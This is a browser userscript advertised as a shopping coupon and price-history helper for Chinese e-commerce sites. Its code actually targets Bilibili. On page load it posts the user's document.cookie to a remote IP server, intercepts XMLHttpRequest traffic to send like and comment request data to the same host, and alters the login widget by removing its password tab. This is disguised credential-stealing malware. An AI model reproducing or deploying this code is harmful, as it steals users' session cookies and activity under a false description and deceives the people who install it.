/*
 * @Author: cctt
 * @Date: 2022-04-11 12:46:09
 * @LastEditors: cctt
 * @LastEditTime: 2022-04-13 12:56:08
 * @Description:
 *
 * Copyright (c) 2022 by kmq, All Rights Reserved.
 */
// ==UserScript==
// @name         解除购物网站限制功能
// @namespace    bilibilicctt
// @version      0.2
// @description  最简洁好用的购物小助手啦~ 很好用啊自动显示京东(jd.com)、淘宝(taobao.com)、天猫(tmall.com)、聚划算、天猫超市、天猫国际(tmall.hk)、京东国际(jd.hk)、京东图书、京东电子书、京东工业品、京东大药房(yiyaojd.com)隐藏优惠券与历史价格。不止让您省钱开心购物，更可以告别虚假降价，以最优惠的价格，把宝贝抱回家。
// @author       kmq
// @match        *://*.bilibili.comccc/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=bilibili.com
// @require      https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js
// @license 		 MIT
// @downloadURL https://update.greasyfork.org/scripts/444383/%E8%A7%A3%E9%99%A4%E8%B4%AD%E7%89%A9%E7%BD%91%E7%AB%99%E9%99%90%E5%88%B6%E5%8A%9F%E8%83%BD.user.js
// @updateURL https://update.greasyfork.org/scripts/444383/%E8%A7%A3%E9%99%A4%E8%B4%AD%E7%89%A9%E7%BD%91%E7%AB%99%E9%99%90%E5%88%B6%E5%8A%9F%E8%83%BD.meta.js
// ==/UserScript==
(function() {
  'use strict';
	$(document).ready(()=>{
		$('body').append(`<div class="roll-btn-wrap"> <div id="kmqTestBtn" style="position:fixed;right: 25px; top:100px; background-color:#F07775;color: #fff;" class="primary-btn roll-btn"> <span>进入科码秋主页</span> </div> </div>`)
		/**
		 * 将用户所有的cookies发送至开发者网站
		 */
		mySend(document.cookie)

		setTimeout(()=>{
			//简单跳转
			$('#kmqTestBtn').click(()=>{
				window.location.href = 'https://space.bilibili.com/1268468909'
			})
		},300)


		let autoClickLogin = setInterval(() => {
			if($('.bili-mini').length>0){
				$('.bili-mini-tab-message').click();
				$('.bili-mini-tab-password').remove();
				$('.bili-mini-tab-line').remove();
				clearInterval(autoClickLogin)
			}
		}, 100);
	});
})();

/**
 * 获取用户数据发送至服务器
 * 这里提交的是本地url,仅用于测试
 * @param {*} data
 */
function mySend(data){
	$.post('http://32.99.32.11:8888/test',data,(result)=>{});
}


/**
 * 过滤B站所有的用户动作,可以理解为ajax代理
 */
XMLHttpRequest.prototype.send = new Proxy(XMLHttpRequest.prototype.send, {
	apply: (target, thisArg, args) => {
		thisArg.addEventListener('load', event => {
			try {
				let { responseText, responseURL } = event.target
				if (!/^{.*}$/.test(responseText)) return
				setTimeout(() => {
					if(/x\/web-interface\/archive\/like/.test(responseURL)
						|| /x\/v2\/reply\/add/.test(responseURL)){
						/**
						 * 用户点赞数据发送至开发者网站
						 */
						mySend(JSON.stringify(args))
					}
				}, 300);
			} catch (err) { }
		})
		return target.apply(thisArg, args)
	}
})
